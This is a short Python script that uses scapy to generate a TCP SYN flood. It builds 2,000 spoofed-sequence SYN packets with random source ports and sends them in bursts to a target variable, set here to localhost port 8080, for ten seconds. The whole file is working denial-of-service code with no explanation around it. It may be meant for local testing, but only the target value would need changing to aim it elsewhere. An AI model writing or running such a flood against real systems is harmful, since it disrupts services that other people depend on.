from scapy.all import IP, TCP, send
import random, time

TARGET="127.0.0.1"; DPORT=8080; DURATION=10
end=time.time()+DURATION
pkts=[]
for _ in range(2000):
    pkts.append(IP(dst=TARGET)/TCP(sport=random.randint(1024,65535),
                                  dport=DPORT, flags="S",
                                  seq=random.randint(0,2**32-1)))
count=0
while time.time()<end:
    send(pkts, verbose=0) # bursts
    count += len(pkts)
print("sent", count)